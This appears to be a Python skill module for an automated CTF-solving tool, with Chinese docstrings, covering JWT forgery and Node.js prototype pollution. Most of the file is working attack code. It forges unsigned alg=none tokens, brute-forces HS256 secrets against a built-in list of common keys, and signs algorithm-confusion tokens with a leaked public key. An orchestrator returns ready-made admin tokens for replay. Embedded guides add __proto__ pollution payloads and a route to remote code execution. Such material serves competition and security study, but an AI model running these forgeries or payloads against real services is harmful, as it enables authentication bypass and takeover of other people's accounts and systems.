"""web_jwt_prototype skill：JWT 伪造 + 原型链污染知识卡片（高难题）。

正式赛高难题（决赛 web 高频新题型）：JWT（算法混淆/弱密钥/none）+ JS
原型链污染（__proto__/constructor.prototype——Node 服务端注入）。
本 skill 提供：JWT 攻击面检测流程 + 原型链污染 payload 模板 + 利用步骤。
"""

import base64
import hashlib
import hmac
import json

_JWT_FLOW = """## JWT 攻击面（高难题——决赛 web 高频）

### 1. 识别与拆解
- 格式：header.payload.signature（三段 base64url，'.' 分隔）
- header: {"alg": "...", "typ": "JWT"}——alg 是攻击关键

### 2. 攻击面（按优先级）
a. alg=none：header 改 {"alg":"none"} + 空签名（后端接受 none = 任意伪造）
b. 算法混淆：RS256(公钥验签) 改 HS256(对称密钥验签)——用公钥当密钥伪造
   （需泄露公钥：/.well-known/jwks.json 或 pem 文件）
c. 弱密钥爆破：HS256 用常见密钥（secret/123456/jwt_secret 等——hashcat 字典）
d. kid 注入：kid 可控 → 路径穿越/命令注入（kid 指定文件内容当密钥）

### 3. 利用流程
1. 取到合法 token（登录/前端 cookie）
2. 尝试 none / 算法混淆 / 弱密钥（按序——每个都试）
3. 伪造 payload（admin=true/role=admin）→ 重放 → 观察 200/403

### 4. payload 模板（python）
import base64, json, hmac, hashlib
def b64url(b): return base64.urlsafe_b64encode(b).rstrip(b'=')
h = b64url(json.dumps({'alg':'none','typ':'JWT'}).encode())
p = b64url(json.dumps({'admin': True, 'user': 'admin'}).encode())
print((h+b'.'+p+b'.').decode())  # alg=none 伪造
"""

_PROTO_FLOW = """## JS 原型链污染（高难题——Node 服务端）

### 1. 触发条件
- 服务端把用户输入合并到对象：Object.assign / lodash.merge / 递归合并
- 输入含 __proto__ / constructor.prototype 键 → 污染 Object.prototype

### 2. payload 模板
- JSON 合并（POST body）：{"__proto__": {"isAdmin": true, "admin": true}}
- query 参数：?__proto__[admin]=true / ?constructor.prototype.admin=true
- 常见目标属性：isAdmin/admin/debug/toString/exec（RCE：child_process）

### 3. 利用流程
1. 找合并点（登录/注册/配置更新 POST——JSON body 合并对象）
2. 注入 __proto__（JSON 解析保留键）→ 观察服务端响应（admin 权限/调试开启）
3. 深度：__proto__.exec → RCE（child_process.exec 被污染）

### 4. 检测特征
- 响应变 admin 权限/调试信息 → 污染成功
- 服务端 500（Object.prototype 被污染导致方法异常）→ 也证明存在
"""


def _decode_jwt_payload(token: str) -> dict:
    """解码 JWT payload（base64url 第二段）——flag 可能在 payload。"""
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return {}
        pad = parts[1] + "=" * (-len(parts[1]) % 4)
        return json.loads(base64.urlsafe_b64decode(pad))
    except Exception:  # noqa: BLE001
        return {}


def _b64url(data: bytes) -> bytes:
    """base64url 编码（去填充）。"""
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def jwt_forge_none(payload: dict) -> str:
    """确定性攻击①：alg=none 伪造（后端若接受 none 即任意身份，命中即秒解）。"""
    try:
        header = {"alg": "none", "typ": "JWT"}
        h = _b64url(json.dumps(header).encode())
        p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
        return (h + b"." + p + b".").decode()
    except Exception:  # noqa: BLE001
        return ""


def jwt_crack_hs256(token: str, words: list = None) -> str:
    """确定性攻击②：HS256 弱密钥爆破（hmac 重算签名比对，命中即秒解）。

    words 为空时用内置常见 JWT 密钥字典（secret/jwt_secret/password 等）。
    """
    if not words:
        words = [
            "secret", "password", "jwt_secret", "jwtsecret", "test", "test123",
            "123456", "12345678", "admin", "root", "key", "key123", "private",
            "public", "token", "t0ken", "flag", "ctf", "dasctf", "welcome",
            "letmein", "qwerty", "passw0rd", "P@ssw0rd", "changeme", "default",
        ]
    try:
        parts = str(token).split(".")
        if len(parts) != 3:
            return ""
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        target_sig = parts[2].encode()
        for w in words:
            sig = _b64url(
                hmac.new(w.encode(), signing_input, hashlib.sha256).digest())
            if sig == target_sig:
                return w
    except Exception:  # noqa: BLE001
        return ""
    return ""


def jwt_alg_confusion(token: str, public_key: str) -> str:
    """确定性攻击③：RS256→HS256 算法混淆（用泄露的公钥当对称密钥伪造）。

    前提：服务端拿到公钥（/.well-known/jwks.json 或 pem），且验签库允许
    对称算法混用（如 Python 的 PyJWT 默认会校验 alg 与 key 类型，需漏洞环境）。
    """
    try:
        parts = str(token).split(".")
        payload_b64 = parts[1] if len(parts) >= 2 else ""
        # 保留原 payload，仅替换 header 为 HS256
        h = _b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
        sig = _b64url(hmac.new(public_key.encode(), h + b"." + payload_b64.encode(),
                               hashlib.sha256).digest())
        return (h + b"." + payload_b64.encode() + b"." + sig).decode()
    except Exception:  # noqa: BLE001
        return ""


def _jwt_attack(token: str, words: list = None, public_key: str = "") -> dict:
    """JWT 确定性攻击编排：按 none → 弱密钥 → 算法混淆 依次尝试。"""
    result = {}
    # 1. alg=none 伪造（构造 admin payload）
    forged = jwt_forge_none({"admin": True, "user": "admin"})
    result["forge_none"] = forged
    result["note_none"] = "若服务端接受 alg=none 则直接重放此 token 获得 admin 权限"
    # 2. HS256 弱密钥爆破
    secret = jwt_crack_hs256(token, words)
    if secret:
        result["hs256_secret"] = secret
        result["note_hs256"] = f"命中弱密钥 {secret!r}：可用其签名任意 payload（jwt_forge_hs256）"
        # 用命中的密钥伪造 admin
        h = _b64url(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
        p = _b64url(json.dumps({"admin": True, "user": "admin"}).encode())
        sig = _b64url(hmac.new(secret.encode(), h + b"." + p, hashlib.sha256).digest())
        result["forge_hs256"] = (h + b"." + p + b"." + sig).decode()
    else:
        result["note_hs256"] = "弱密钥字典未命中——可换更大字典（rockyou）"
    # 3. 算法混淆（需公钥）
    if public_key:
        result["forge_alg_confusion"] = jwt_alg_confusion(token, public_key)
    return result


def web_jwt_prototype(params: dict) -> dict:
    """skill 入口：JWT/原型链知识卡片 + 确定性伪造 + token 拆解。"""
    token = str(params.get("token", ""))
    scenario = str(params.get("scenario", ""))
    words = params.get("words")
    public_key = str(params.get("public_key", ""))
    result = {"ok": True}
    result["jwt_flow"] = _JWT_FLOW
    result["proto_flow"] = _PROTO_FLOW

    if token:
        result["jwt_payload"] = _decode_jwt_payload(token)
        # 确定性攻击编排（none → HS256 弱密钥 → 算法混淆），命中即秒解
        result["attack"] = _jwt_attack(token, words, public_key)
        result["token_note"] = "已拆解 token payload 并执行确定性伪造/爆破（admin/role 字段可改 → 重放）"
    if scenario:
        low = scenario.lower()
        if "jwt" in low or "token" in low:
            result["scenario_hint"] = "JWT：先试 alg=none → 算法混淆 → 弱密钥（按序）"
        elif "原型" in low or "proto" in low or "merge" in low:
            result["scenario_hint"] = "原型链：找合并点注入 __proto__（isAdmin/admin 优先）"
    return result


def run(params: dict) -> dict:
    """SkillManager 统一入口（2026-08-21 补——正式赛 skill 自动加载约定）。"""
    return web_jwt_prototype(params)


def main() -> None:
    import json as _json

    print(_json.dumps(web_jwt_prototype(
        {"token": "eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0."}), ensure_ascii=False, indent=1)[:400])


if __name__ == "__main__":
    main()
